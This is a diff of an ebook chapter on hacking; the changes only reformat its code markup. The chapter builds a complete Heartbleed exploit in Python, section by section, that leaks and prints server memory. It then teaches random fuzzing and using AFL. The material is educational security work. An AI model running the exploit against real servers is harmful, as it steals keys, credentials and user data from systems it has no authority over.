@@ -35,8 +35,8 @@
 		<p class="noindent">Let’s write a Python program that exploits the Heartbleed bug. The program will be longer than the programs we normally write, so instead of showing a single block of code, I’ll break the program up into sections and discuss each section individually. You can reconstruct the program by copying each section into a file called <em>heartbleed.py</em>.</p>
 		<p class="indent">Before we begin coding, let’s discuss the general overview of the exploit. We’ll begin by establishing a socket connection to the server. Then, we’ll manually initiate a TLS connection by sending a client <em>hello</em> message. After we’ve sent the <em>hello</em> message, we’ll continue to receive packets until we receive the <em>Server Done</em> message. Once we’ve received this message, we’ll transmit an empty Heartbeat message with a stated length of 64KB. We chose 64KB because it’s the maximum possible length and will allow us to extract the most information. If the server is vulnerable, it will respond with 64KB of its memory. Because each Heartbeat packet can hold only 16KB of data, <span epub:type="pagebreak" id="page_162"/>the 64KB response will be split across four packets. By printing the contents of these packets, we can read parts of the server’s memory.</p>
 		<p class="indent">Let’s begin by importing the libraries we’ll use throughout the process:</p>
-		<p class="programs">import sys<br/>import socket<br/>import struct<br/>import select<br/>import array</p>
-		<p class="indent">We’ll use command line arguments to pass options to our program, so we’ll need the <span class="literal">sys</span> library to read these arguments. Then we’ll use the <span class="literal">socket</span> and <span class="literal">select</span> libraries to establish a TCP socket connection to the vulnerable server. Lastly, we’ll use the <span class="literal">struct</span> and <span class="literal">array</span> libraries to extract and package the bytes associated with each field in the packets we receive.</p>
+		<pre>import sys<br/>import socket<br/>import struct<br/>import select<br/>import array</pre>
+		<p class="indent">We’ll use command line arguments to pass options to our program, so we’ll need the <code>sys</code> library to read these arguments. Then we’ll use the <code>socket</code> and <code>select</code> libraries to establish a TCP socket connection to the vulnerable server. Lastly, we’ll use the <code>struct</code> and <code>array</code> libraries to extract and package the bytes associated with each field in the packets we receive.</p>
 		<h4 class="h4" id="ch09lev4"><strong><em>Writing the Client Hello Message</em></strong></h4>
 		<p class="noindent">Next, we’ll construct the client’s <em>hello</em> message, which is the first message sent by the TLS 1.2 protocol. (The IETF outlines the TLS 1.2 specification in RFC 5246. We’ll use this specification to construct the packets that we’ll send in this chapter.) <a href="ch09.xhtml#ch9fig3">Figure 9-3</a> represents the layout of each bit in the <em>Client Hello</em> packet. The numbers at the top present each bit, numbered from 0 to 31, and the labels represent the fields and their positions in the packet. You’ll commonly find diagrams like these in the IETF’s RFC documents, which describe protocols.</p>
 		<div class="image" id="ch9fig3">
@@ -47,7 +47,7 @@
 		<p class="indent">The next 16 bits represent the <em>TLS Version</em>, and a value of 0x0303 represents version 1.2. The 16 bits after that represent the <em>Packet Length</em>, which is the total length of the packet in bytes. Next is the 8-bit <em>Message Type</em> (see <a href="ch09.xhtml#ch9fig2">Figure 9-2</a> for a list of the types of messages exchanged during a TLS v1.2 handshake). A value of 0x01 represents a <em>Client Hello</em> message. Following that is 24 bits indicating the <em>Message Length</em>, that is, the number of bytes remaining in the packet. Then comes the 16-bit <em>Client TLS Version</em>, which is the version of TLS that the client is currently running, and the 32-bit <em>Client Random</em>, a nonce supplied during the TLS exchange.</p>
 		<p class="indent">The next eight bits represent the <em>Session ID Length</em>. The Session ID identifies the session and is used to resume incomplete or failed sessions. We won’t use this field, and as you’ll see, we’ll set its length to 0x00. The <em>Cipher Suite Length</em> is the length in bytes of the next field, which contains the <em>Cipher Suites</em>. In this case we will set the value of this field to 0x00,0x02 to indicate that the supported cipher suite information is two bytes long. As for the types of ciphers the client supports, we will use the value 0x00, 0x2f, indicating that the client supports RSA for key exchange and uses the 128-bit AES and a cipher block chaining mode for encryption (see <a href="ch05.xhtml#ch5">Chapter 5</a> for more information on block cipher modes). The final 16 bits represent the <em>Extension Length</em>. We’re not using any extensions, so we’ll set this value to 0.</p>
 		<p class="indent">We can manually construct the packet by setting each of the bytes (sets of eight bits) ourselves. We’ll represent the values as hexadecimal numbers. Copy the following code snippet into your <em>heartbleed.py</em> file; I’ve pointed out each hexadecimal value using comments:</p>
-		<p class="programs">clientHello = (<br/>
+		<pre>clientHello = (<br/>
     0x16,             # Type: Handshake record<br/>
     0x03, 0x03,       # TLS Version : Version 1.2<br/>
     0x00, 0x2f,       # Packet Length : 47 bytes<br/>
@@ -64,15 +64,15 @@
     0x00, 0x2f,       # Cipher Suite - TLS_RSA_WITH_AES_128_CBC_SHA<br/>
     0x01, 0x00,       # Compression: length 0x1 byte &amp; 0x00 (no compression)<br/>
     0x00, 0x00,       # Extension Length: 0, No extensions<br/>
-)</p>
+)</pre>
 		<p class="indent"><span epub:type="pagebreak" id="page_164"/>Great, we’ve constructed the <em>Client Hello</em> message. But before we send it, let’s discuss the structure of the packets we’ll receive in response.</p>
 		<h4 class="h4" id="ch09lev5"><strong><em>Reading the Server Response</em></strong></h4>
 		<p class="noindent">The server will transmit four packets, all of which have a similar structure to the <em>Client Hello</em> message. The type, version, packet length, and message type fields appear in the same location.</p>
 		<p class="indent">We can detect the <em>Server Done</em> message by inspecting the <em>Message Type</em>, located at the sixth byte. A hexadecimal value of 0x02 represents the <em>Server Hello</em>, whereas values of 0x0b, 0x0c and 0x0e represent the <em>Server Certificate</em> message, <em>Server Key Exchange</em> message, and <em>Server Done</em> message, respectively.</p>
 		<p class="indent">We’re not interested in actually establishing an encrypted connection, so we can ignore all the messages we receive from the server until we get the <em>Server Done</em> message. Once we’ve received this message, we’ll know that the server has completed its part of the handshake and we can now send our first Heartbeat message. Create a constant to hold the hexadecimal value representing the type <em>Server Done</em>:</p>
-		<p class="programs">SERVER_HELLO_DONE = 14 #0x0e</p>
+		<pre>SERVER_HELLO_DONE = 14 #0x0e</pre>
 		<p class="indent">Next, let’s write a helper function that will ensure we correctly receive all the bytes associated with the TLS packet. This function will let us receive a fixed number of bytes from a socket. The function will wait for the operating system to finish loading bytes into the socket’s buffer and then will continue reading from the buffer until it has read the specified number of bytes:</p>
-		<p class="programs">def recv_all(socket, length):<br/>
+		<pre>def recv_all(socket, length):<br/>
     response = b''<br/>
     total_bytes_remaining = length<br/>
     while total_bytes_remaining &gt; 0:<br/>
@@ -81,11 +81,11 @@
          <span class="ent">➋</span> data = socket.recv(total_bytes_remaining)<br/>
             response += data<br/>
             total_bytes_remaining -= len(data)<br/>
-   return response</p>
-		<p class="indent">We use the <span class="literal">select()</span> function to monitor the socket <span class="ent">➊</span>. After the operating system has written to the buffer, the <span class="literal">select()</span> function will unblock and allow the program to progress to the next line. The <span class="literal">select()</span> function takes three parameters, which represent lists of communication channels to monitor. The first list contains channels that are readable, the second contains channels that are writable, and the third contains channels that should be monitored for errors. When a socket becomes readable or writable, or contains errors, it is returned by the <span class="literal">select()</span> function.</p>
-		<p class="indent"><span epub:type="pagebreak" id="page_165"/>Then, the socket attempts to read the remaining bytes from the socket buffer <span class="ent">➋</span>. The parameter represents the maximum number of bytes to read. If this is less than the maximum number of bytes available, the socket <span class="literal">recv()</span> function will read as many bytes as are available.</p>
+   return response</pre>
+		<p class="indent">We use the <code>select()</code> function to monitor the socket <span class="ent">➊</span>. After the operating system has written to the buffer, the <code>select()</code> function will unblock and allow the program to progress to the next line. The <code>select()</code> function takes three parameters, which represent lists of communication channels to monitor. The first list contains channels that are readable, the second contains channels that are writable, and the third contains channels that should be monitored for errors. When a socket becomes readable or writable, or contains errors, it is returned by the <code>select()</code> function.</p>
+		<p class="indent"><span epub:type="pagebreak" id="page_165"/>Then, the socket attempts to read the remaining bytes from the socket buffer <span class="ent">➋</span>. The parameter represents the maximum number of bytes to read. If this is less than the maximum number of bytes available, the socket <code>recv()</code> function will read as many bytes as are available.</p>
 		<p class="indent">The next function we’ll write will read packets from the socket and extract their type, version, and payload:</p>
-		<p class="programs">def readPacket(socket):<br/>
+		<pre>def readPacket(socket):<br/>
     headerLength = 6<br/>
     payload = b''<br/>
   <span class="ent">➊</span> header =  recv_all(socket, headerLength)<br/>
@@ -96,10 +96,10 @@
          <span class="ent">➌</span> payload +=  recv_all(socket,length 1)<br/>
     else:<br/>
         print("Response has no header")<br/>
-    return type, version,  payload, msgType</p>
+    return type, version,  payload, msgType</pre>
 		<p class="indent">We read six bytes (0, 1, 2, 3, 4, and 5) from the socket <span class="ent">➊</span>. These six bytes represent the header fields associated with TLS 1.2 packets discussed earlier: type, version, length, and message type.</p>
-		<p class="indent">Then, we’ll use the <span class="literal">struct</span> library to unpack the bytes into four variables <span class="ent">➋</span>. The greater than sign (&gt;) tells the <span class="literal">struct</span> library to interpret the bits in big-endian format. (In the big-endian format, the most significant byte is at the smallest address. Network packets are normally in big-endian format.) The <span class="literal">B</span> tells the <span class="literal">struct</span> library to extract the first byte (8 bits) as an unsigned char (a value between 0 and 255), and the <span class="literal">H</span> tells the <span class="literal">struct</span> library to extract the next two bytes (16 bits) as an unsigned short. We place the first 8-bit value into the <span class="literal">type</span> variable and the next two bytes into the <span class="literal">version</span> variable. Then we place the following two bytes in the <span class="literal">length</span> variable and the final byte in the <span class="literal">msgType</span> variable. The <span class="literal">length</span> field represents the length of the payload. If it’s greater than 0 <span class="ent">➌</span>, we can read the remaining bytes associated with the packet from the socket.</p>
-		<p class="indent">All messages have a similar structure, so we can reuse the same <span class="literal">readPacket</span> method for all subsequent packets we receive.</p>
+		<p class="indent">Then, we’ll use the <code>struct</code> library to unpack the bytes into four variables <span class="ent">➋</span>. The greater than sign (&gt;) tells the <code>struct</code> library to interpret the bits in big-endian format. (In the big-endian format, the most significant byte is at the smallest address. Network packets are normally in big-endian format.) The <code>B</code> tells the <code>struct</code> library to extract the first byte (8 bits) as an unsigned char (a value between 0 and 255), and the <code>H</code> tells the <code>struct</code> library to extract the next two bytes (16 bits) as an unsigned short. We place the first 8-bit value into the <code>type</code> variable and the next two bytes into the <code>version</code> variable. Then we place the following two bytes in the <code>length</code> variable and the final byte in the <code>msgType</code> variable. The <code>length</code> field represents the length of the payload. If it’s greater than 0 <span class="ent">➌</span>, we can read the remaining bytes associated with the packet from the socket.</p>
+		<p class="indent">All messages have a similar structure, so we can reuse the same <code>readPacket</code> method for all subsequent packets we receive.</p>
 		<h4 class="h4" id="ch09lev6"><strong><em>Crafting the Malicious Heartbeat Request</em></strong></h4>
 		<p class="noindent">Once we’ve received the <em>Server Done</em> message, we can send the Heartbeat request.</p>
 		<p class="indent"><a href="ch09.xhtml#ch9fig4">Figure 9-4</a> represents the layout of a Heartbeat packet. Both the request and response packets follow this structure. The sixth byte identifies whether the packet is either a response or request.</p>
@@ -109,27 +109,27 @@
 		</div>
 		<p class="figcap"><em>Figure 9-4: A malicious Heartbeat packet</em></p>
 		<p class="indent">Our malformed request message looks like this:</p>
-		<p class="programs">heartbeat = (<br/>
+		<pre>heartbeat = (<br/>
      0x18,        # Type: Heartbeat Message<br/>
      0x03, 0x03,  # TLS Version : Version 1.2<br/>
   <span class="ent">➊</span> 0x00, 0x03,  # Packet Length : 3 bytes<br/>
      0x01,        # Heartbeat Request<br/>
   <span class="ent">➋</span> 0x00, 0x40   # Payload length 64KB<br/>
-                 )</p>
+                 )</pre>
 		<p class="indent">Notice the discrepancy between the packet length <span class="ent">➊</span> of 3 bytes (which represents the remaining bytes in the packet) and the payload length <span class="ent">➋</span> of 64KB. Shouldn’t the packet length include payload length? How is it possible that the payload length is larger than the total packet size?</p>
 		<p class="indent">This is the “malformed” aspect of the request. Remember from <a href="ch09.xhtml#ch9fig1">Figure 9-1</a> that we’re specifying a payload length of 64KB, which is the largest we can specify with the allotted 16 bits, but that the actual payload size is 0.</p>
 		<h4 class="h4" id="ch09lev7"><strong><em>Reading the Leaked Memory Contents</em></strong></h4>
 		<p class="noindent">As mentioned earlier, Heartbeat packets are limited to a maximum length of 16KB. This means that the 64KB of memory the server sends in response will be split across four 16KB packets. Let’s write the function that will read all four packets from the socket and combine their payloads into a single 64KB payload:</p>
-		<p class="programs">def readServerHeartBeat(socket):<br/>
+		<pre>def readServerHeartBeat(socket):<br/>
     payload  = b''<br/>
     for i in range(0, 4):<br/>
      <span class="ent">➊</span> type, version, packet_payload, msgType =  readPacket(socket)<br/>
      <span class="ent">➋</span> payload += packet_payload<br/>
-    return (type, version,  payload, msgType)</p>
-		<p class="indent">We call the <span class="literal">readPacket()</span> function four times to read the four Heartbeat responses we expect from the vulnerable server <span class="ent">➊</span>. Then, we combine all the payloads of the four responses into a single payload <span class="ent">➋</span>.</p>
+    return (type, version,  payload, msgType)</pre>
+		<p class="indent">We call the <code>readPacket()</code> function four times to read the four Heartbeat responses we expect from the vulnerable server <span class="ent">➊</span>. Then, we combine all the payloads of the four responses into a single payload <span class="ent">➋</span>.</p>
 		<h4 class="h4" id="ch09lev8"><span epub:type="pagebreak" id="page_167"/><strong><em>Writing the Exploit Function</em></strong></h4>
-		<p class="noindent">The following code snippet implements the <span class="literal">exploit()</span> function, which will send the malformed Heartbeat request and read the four Heartbeat response packets:</p>
-		<p class="programs">def exploit(socket):<br/><span class="ent">➊</span> HEART_BEAT_RESPONSE = 21 #0x15<br/>
+		<p class="noindent">The following code snippet implements the <code>exploit()</code> function, which will send the malformed Heartbeat request and read the four Heartbeat response packets:</p>
+		<pre>def exploit(socket):<br/><span class="ent">➊</span> HEART_BEAT_RESPONSE = 21 #0x15<br/>
    payload = b''<br/><span class="ent">➋</span> socket.send(array.array('B', heartbeat))<br/>
    print("Sent Heartbeat ")<br/><span class="ent">➌</span> type, version, payload, msgType = readServerHeartBeat(socket)<br/>
    if type is not None:<br/>
@@ -137,11 +137,11 @@
         <span class="ent">➍</span> print(payload.decode('utf-8'))<br/>
     else:<br/>
         print("No heartbeat received")<br/>
-    socket.close()</p>
-		<p class="indent">The type value of <span class="literal">0x15</span> indicates a Heartbeat response packet <span class="ent">➊</span>. Next, we send the malformed request <span class="ent">➋</span>, and then we read the four response packets <span class="ent">➌</span>. Lastly, we print the payload <span class="ent">➍</span>.</p>
+    socket.close()</pre>
+		<p class="indent">The type value of <code>0x15</code> indicates a Heartbeat response packet <span class="ent">➊</span>. Next, we send the malformed request <span class="ent">➋</span>, and then we read the four response packets <span class="ent">➌</span>. Lastly, we print the payload <span class="ent">➍</span>.</p>
 		<h4 class="h4" id="ch09lev9"><strong><em>Putting It Together</em></strong></h4>
 		<p class="noindent">In the program’s main method, we’ll create the socket, send the packets, and wait for the <em>Server Done</em> response. Copy the following code into your file:</p>
-		<p class="programs">def main():<br/>
+		<pre>def main():<br/>
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
   <span class="ent">➊</span> s.connect((sys.argv[1], 443))<br/>
   <span class="ent">➋</span> s.send(array.array('B',clientHello))<br/>
@@ -151,14 +151,14 @@
         if (msgType == SERVER_HELLO_DONE):<br/>
             serverHelloDone = True<br/>
   <span class="ent">➍</span> exploit(s)<br/>if __name__ == '__main__':<br/>
-    main()</p>
-		<p class="indent">After we’ve created the socket, we can connect to the IP address that was passed as a command line argument <span class="ent">➊</span>. We’ll connect on port 443 because it’s associated with the TLS protocol we’re attacking. Once connected, we initiate the TLS v1.2 connection by sending the <em>Client Hello</em> message <span class="ent">➋</span>. Then, we’ll listen for the response messages and inspect each type until we receive the <em>Server Done</em> message <span class="ent">➌</span>. Lastly, we call the <span class="literal">exploit()</span> function <span class="ent">➍</span>.</p>
+    main()</pre>
+		<p class="indent">After we’ve created the socket, we can connect to the IP address that was passed as a command line argument <span class="ent">➊</span>. We’ll connect on port 443 because it’s associated with the TLS protocol we’re attacking. Once connected, we initiate the TLS v1.2 connection by sending the <em>Client Hello</em> message <span class="ent">➋</span>. Then, we’ll listen for the response messages and inspect each type until we receive the <em>Server Done</em> message <span class="ent">➌</span>. Lastly, we call the <code>exploit()</code> function <span class="ent">➍</span>.</p>
 		<h3 class="h3" id="ch09lev10"><span epub:type="pagebreak" id="page_168"/><strong>Fuzzing</strong></h3>
 		<p class="noindent">How do hackers find bugs like Heartbleed? As you just saw, the process of exploiting this bug is so intricate that it’s amazing anyone could possibly discover it using efficient means. There’s even an entire team at Google, called Project Zero, dedicated to finding zero-day vulnerabilities. (In case you’re interested, the team posts new vulnerabilities they discover on its blog at <em><a href="https://googleprojectzero.blogspot.com/">https://googleprojectzero.blogspot.com/</a></em>.) Let’s discuss some of the tools and techniques attackers and security researchers use to discover bugs like Heartbleed, beginning with a testing technique called <em>fuzzing</em>.</p>
 		<p class="indent">Fuzzing techniques attempt to generate inputs that explore all the possible paths in a program in the hopes of discovering one that will cause the program to crash or exhibit unintended behavior. Fuzzing was first proposed in 1988 by Barton Miller, a professor at the University of Wisconsin. Since then, companies like Google and Microsoft have developed their own fuzzers (tools for fuzzing) and use fuzzing to test their own systems.</p>
 		<h4 class="h4" id="ch09lev11"><strong><em>A Simplified Example</em></strong></h4>
 		<p class="noindent">To understand the basic concept behind fuzzing, we’ll begin by considering the following example function, originally proposed by Jeff Foster at Tufts University:</p>
-		<p class="programs">def testFunction(a,b,c):<br/>
+		<pre>def testFunction(a,b,c):<br/>
    x, y, z = 0, 0, 0<br/>
    if (a):<br/>
        x = -2<br/>
@@ -166,20 +166,20 @@
       if (not a and c):<br/>
          y = 1<br/>
       z = 2<br/>
-   assert(x + y + z != 3)</p>
-		<p class="indent">As you can see, the function accepts three parameters, <span class="literal">a</span>, <span class="literal">b</span>, and <span class="literal">c</span>, and it is considered to have executed correctly as long as its internal variables (<span class="literal">x</span>,<span class="literal">y</span>, and <span class="literal">z</span>) don’t add up to three. If they do, the program’s <span class="literal">assert</span> statement, which for the purposes of this example represents a critical failure, will be triggered.</p>
-		<p class="indent">Our goal as fuzzers is to cause this failure. Can you identify the parameter values that will cause the <span class="literal">assert</span> statement to be triggered? One way to determine which inputs trigger the <span class="literal">assert</span> statement is to visualize the paths through the program as a tree. Every time we encounter an <span class="literal">if</span> statement, the tree branches to represent two possible options, one in which the branch is taken and the one in which it isn’t. <a href="ch09.xhtml#ch9fig5">Figure 9-5</a> shows the paths in the preceding function.</p>
+   assert(x + y + z != 3)</pre>
+		<p class="indent">As you can see, the function accepts three parameters, <code>a</code>, <code>b</code>, and <code>c</code>, and it is considered to have executed correctly as long as its internal variables (<code>x</code>,<code>y</code>, and <code>z</code>) don’t add up to three. If they do, the program’s <code>assert</code> statement, which for the purposes of this example represents a critical failure, will be triggered.</p>
+		<p class="indent">Our goal as fuzzers is to cause this failure. Can you identify the parameter values that will cause the <code>assert</code> statement to be triggered? One way to determine which inputs trigger the <code>assert</code> statement is to visualize the paths through the program as a tree. Every time we encounter an <code>if</code> statement, the tree branches to represent two possible options, one in which the branch is taken and the one in which it isn’t. <a href="ch09.xhtml#ch9fig5">Figure 9-5</a> shows the paths in the preceding function.</p>
 		<div class="image" id="ch9fig5">
 			<span epub:type="pagebreak" id="page_169"/>
 			<img alt="image" src="../images/ch09fig05.jpg"/>
 		</div>
 		<p class="figcap"><em>Figure 9-5: A visualization of the execution paths in the test function</em></p>
-		<p class="indent">One of these paths triggers the <span class="literal">assert</span> statement. Consider what would happen if we supplied inputs of 0, 2, and 1 for <span class="literal">a</span>, <span class="literal">b</span>, and <span class="literal">c</span>. In Python, 0 is equivalent to <span class="literal">False</span>, whereas non-zero integers are considered <span class="literal">True</span>. Trace the path that the input takes through the tree. Notice that this path sets <span class="literal">x</span> to 0, <span class="literal">y</span> to 1, and <span class="literal">z</span> to 2, which triggers the <span class="literal">assert</span> statement.</p>
+		<p class="indent">One of these paths triggers the <code>assert</code> statement. Consider what would happen if we supplied inputs of 0, 2, and 1 for <code>a</code>, <code>b</code>, and <code>c</code>. In Python, 0 is equivalent to <code>False</code>, whereas non-zero integers are considered <code>True</code>. Trace the path that the input takes through the tree. Notice that this path sets <code>x</code> to 0, <code>y</code> to 1, and <code>z</code> to 2, which triggers the <code>assert</code> statement.</p>
 		<h4 class="h4" id="ch09lev12"><strong><em>Writing Your Own Fuzzer</em></strong></h4>
 		<p class="noindent">We had no trouble discovering a harmful input in the last example, but in larger programs, there could be millions of unique paths. Exploring them by hand would be very difficult.</p>
 		<p class="indent">Could we write a program to generate test inputs? One approach would be to randomly generate inputs and wait for them to exercise all the paths in the program. This technique is called <em>random fuzzing</em>. Let’s write a basic random fuzzer. Our program will generate random integer values and pass those values to our test program’s parameters.</p>
 		<p class="indent">Create a new file called <em>myFuzzer.py</em> and add the following contents:</p>
-		<p class="programs">   import random as rand<br/>
+		<pre>   import random as rand<br/>
    import sys<br/>
    #-----------------------------------------<br/><span class="ent">➊</span> #    Place Test function here<br/>
    #-----------------------------------------<br/><br/>
@@ -190,10 +190,10 @@
           c = rand.randint(-200, 200)<br/>
           print(a,b,c)<br/>
           testFunction(a,b,c)<br/><br/><br/><span epub:type="pagebreak" id="page_170"/>if __name__ == "__main__":<br/>
-    main()</p>
-		<p class="indent">Copy the <span class="literal">testFunction()</span> function shown earlier into the file <span class="ent">➊</span>. Our simple fuzzing program generates a random integer for each input variable <span class="ent">➋</span>. Once we’ve generated a random value for each variable, we print the input to the screen before calling the function we’re testing.</p>
+    main()</pre>
+		<p class="indent">Copy the <code>testFunction()</code> function shown earlier into the file <span class="ent">➊</span>. Our simple fuzzing program generates a random integer for each input variable <span class="ent">➋</span>. Once we’ve generated a random value for each variable, we print the input to the screen before calling the function we’re testing.</p>
 		<p class="indent">Save the file and then run the fuzzer using the following command:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">python3 myFuzzer.py</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">python3 myFuzzer.py</span></pre>
 		<p class="indent">The fuzzer will cycle through random values until it finds one that stops the program. Experiment by increasing the range from 200 to 400. The more random numbers the program needs to consider, the longer it will take to discover an input that crashes the program. This is one of the disadvantages of completely random fuzzing. You’ll need to cycle through many benign inputs to discover a useful one. Later in this chapter, we’ll look at ways to address this issue.</p>
 		<p class="indent">You might be wondering: Is generating input that crashes a program really that useful? Crashes are the first step to discovering bugs, which attackers can often exploit. But generating data that crashes a program can be very useful in its own right, too. If you can get an application to crash, you could execute a denial of service (DoS) attack. Imagine if you could discover input that crashes the Google DNS server or a cell tower. That would be pretty valuable.</p>
 		<p class="indent">Or consider the following scenario: a hacker has fuzzed an intranet-connected traffic light control system. (Surprisingly, such devices are common.) The hacker discovers some input that crashes the system, thus disabling all of the traffic lights it controls. They’ve now discovered an input sequence that will allow them to disable traffic lights at will. This is very dangerous and is an excellent reminder of why it’s important for ethical hackers to penetration-test systems before they are deployed.</p>
@@ -203,20 +203,20 @@
 		<p class="indent">The fuzzer creates new genetic input sequences by introducing randomness to the values of existing sequences. For example, the input sequence [0, 2, 1] may become [4, 0, 1]. Here, the genetic algorithm chose to mutate the first and second elements by randomly adding four and subtracting two, respectively. Genetic algorithm implementations often allow programs to choose how often mutations occur and whether to make large or small changes. The new sequence is then fed to the program. If the sequence explores a new path, the input is maintained, and if it doesn’t, it is deleted or mutated.</p>
 		<p class="indent">There are plenty of other mutation strategies that you can explore. For example, crossovers mix sequences from two genes to create a new gene. You can read more about genetic algorithms in John Holland’s original paper, “Genetic Algorithms and Adaptation” (Adaptive Control of Ill-Defined Systems, 1984).</p>
 		<h5 class="h5" id="ch09lev14"><strong>Installing AFL</strong></h5>
-		<p class="noindent">Let’s run AFL to discover an input sequence that causes the <span class="literal">testFunction()</span> function to crash. You can download AFL from Google’s offical GitHub page. Clone the AFL repository by running the following command:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">git clone https://github.com/google/AFL.git</span></p>
+		<p class="noindent">Let’s run AFL to discover an input sequence that causes the <code>testFunction()</code> function to crash. You can download AFL from Google’s offical GitHub page. Clone the AFL repository by running the following command:</p>
+		<pre>kali@kali:~$ <span class="codestrong1">git clone https://github.com/google/AFL.git</span></pre>
 		<p class="indent">Next, navigate to the <em>AFL</em> directory:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">cd AFL</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">cd AFL</span></pre>
 		<p class="indent">Compile and install the program by running the following command:</p>
-		<p class="programs">kali@kali:~/AFL$ <span class="codestrong1">make &amp;&amp; sudo make install</span></p>
-		<p class="indent">AFL was originally designed to fuzz C and C++ programs. AFL instruments these programs by compiling the source code and instrumenting the binary. We won’t be fuzzing C programs, so we’ll need to install <span class="literal">python-afl</span>, a program that extends AFL’s functionality to Python programs. We’ll use <span class="literal">pip3</span> to install the module. If you don’t already have it, run the following command to install <span class="literal">pip</span>:</p>
-		<p class="programs">kali@kali:~/AFL$ <span class="codestrong1">sudo apt-get install python3-pip</span></p>
-		<p class="indent">Then, install <span class="literal">python-afl</span> by running the following command:</p>
-		<p class="programs">kali@kali:~/AFL$ <span class="codestrong1">sudo pip3 install python-afl</span></p>
-		<p class="indent">Now that you’ve installed <span class="literal">python-afl</span>, let’s use it to fuzz the test function. Create a new Desktop folder called <em>Fuzzer</em>, and within the <em>Fuzzer</em> folder, create three folders called <em>TestInput</em>, <em>App</em>, and <em>Results</em>. We’ll store our test input <span epub:type="pagebreak" id="page_172"/>files in the <em>TestInput</em> folder, and the results of our fuzz in the <em>Results</em> folder. We’ll store the code for the app that we want to fuzz in the <em>App</em> folder.</p>
+		<pre>kali@kali:~/AFL$ <span class="codestrong1">make &amp;&amp; sudo make install</span></pre>
+		<p class="indent">AFL was originally designed to fuzz C and C++ programs. AFL instruments these programs by compiling the source code and instrumenting the binary. We won’t be fuzzing C programs, so we’ll need to install <code>python-afl</code>, a program that extends AFL’s functionality to Python programs. We’ll use <code>pip3</code> to install the module. If you don’t already have it, run the following command to install <code>pip</code>:</p>
+		<pre>kali@kali:~/AFL$ <span class="codestrong1">sudo apt-get install python3-pip</span></pre>
+		<p class="indent">Then, install <code>python-afl</code> by running the following command:</p>
+		<pre>kali@kali:~/AFL$ <span class="codestrong1">sudo pip3 install python-afl</span></pre>
+		<p class="indent">Now that you’ve installed <code>python-afl</code>, let’s use it to fuzz the test function. Create a new Desktop folder called <em>Fuzzer</em>, and within the <em>Fuzzer</em> folder, create three folders called <em>TestInput</em>, <em>App</em>, and <em>Results</em>. We’ll store our test input <span epub:type="pagebreak" id="page_172"/>files in the <em>TestInput</em> folder, and the results of our fuzz in the <em>Results</em> folder. We’ll store the code for the app that we want to fuzz in the <em>App</em> folder.</p>
 		<h5 class="h5" id="ch09lev15"><strong>Modifying the Program</strong></h5>
-		<p class="noindent">The <span class="literal">python-afl</span> fuzzer assumes that test inputs are read in from a file supplied via <em>std.in</em>, so we’ll need to modify the program to do so. The following program reads values for <span class="literal">a</span>, <span class="literal">b</span>, and <span class="literal">c</span> from <em>std.in</em>, which are then converted from strings to integers and passed to the test function. Create a file called <em>fuzzExample.py</em> in the <em>App</em> folder and add the following code:</p>
-		<p class="programs">import sys<br/>import afl<br/>import os<br/><br/>
+		<p class="noindent">The <code>python-afl</code> fuzzer assumes that test inputs are read in from a file supplied via <em>std.in</em>, so we’ll need to modify the program to do so. The following program reads values for <code>a</code>, <code>b</code>, and <code>c</code> from <em>std.in</em>, which are then converted from strings to integers and passed to the test function. Create a file called <em>fuzzExample.py</em> in the <em>App</em> folder and add the following code:</p>
+		<pre>import sys<br/>import afl<br/>import os<br/><br/>
 #-----------------------------------------<br/>
 #   Place test function here<br/>
 #-----------------------------------------<br/><br/>def main():<br/>
@@ -228,28 +228,28 @@
     testFunction(a,b,c)<br/><br/>if __name__ == "__main__":<br/>
  <span class="ent">➌</span> afl.init()<br/>
     main()<br/>
- <span class="ent">➍</span> os._exit(0)</p>
+ <span class="ent">➍</span> os._exit(0)</pre>
 		<p class="indent">Remember to copy the test function into the location specified by the comment.</p>
-		<p class="indent">Next, we read the contents from <em>std.in</em> <span class="ent">➊</span>. We then strip trailing spaces and newline characters <span class="ent">➋</span>. We also split up the line into three variables: <span class="literal">a</span>, <span class="literal">b</span>, and <span class="literal">c</span>. At <span class="ent">➌</span>, we instruct the AFL library to begin instrumenting the program by calling <span class="literal">afl.init()</span>. Then, we execute our main method before exiting <span class="ent">➍</span>. It’s good practice to call <span class="literal">os._exit(0)</span> so that you can quickly terminate the fuzzing run, but this isn’t required.</p>
+		<p class="indent">Next, we read the contents from <em>std.in</em> <span class="ent">➊</span>. We then strip trailing spaces and newline characters <span class="ent">➋</span>. We also split up the line into three variables: <code>a</code>, <code>b</code>, and <code>c</code>. At <span class="ent">➌</span>, we instruct the AFL library to begin instrumenting the program by calling <code>afl.init()</code>. Then, we execute our main method before exiting <span class="ent">➍</span>. It’s good practice to call <code>os._exit(0)</code> so that you can quickly terminate the fuzzing run, but this isn’t required.</p>
 		<h5 class="h5" id="ch09lev16"><strong>Creating Test Cases</strong></h5>
 		<p class="noindent">Next, we need some test cases to pass to our program. Open a terminal and navigate to the <em>Fuzzer</em> folder on your Desktop by running this command:</p>
-		<p class="programs">kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Fuzzer</span></p>
-		<p class="indent"><span epub:type="pagebreak" id="page_173"/>Run the following command to create a <em>testInput1.txt</em> file in the <em>TestInput</em> folder that contains the values <span class="literal">0</span>, <span class="literal">1</span>, and <span class="literal">1</span>:</p>
-		<p class="programs">kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "0 10 1" &gt; TestInput/testInput1.txt</span></p>
+		<pre>kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Fuzzer</span></pre>
+		<p class="indent"><span epub:type="pagebreak" id="page_173"/>Run the following command to create a <em>testInput1.txt</em> file in the <em>TestInput</em> folder that contains the values <code>0</code>, <code>1</code>, and <code>1</code>:</p>
+		<pre>kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">echo "0 10 1" &gt; TestInput/testInput1.txt</span></pre>
 		<p class="indent"><em>Redirect</em> (&lt;) these values into the program by running this command:</p>
-		<p class="programs">kali@kali:~/Desktop/Fuzzer$ <span class="codestrong1">python3 App/fuzzExample.py &lt; TestInput/testInput1.txt</span></p>
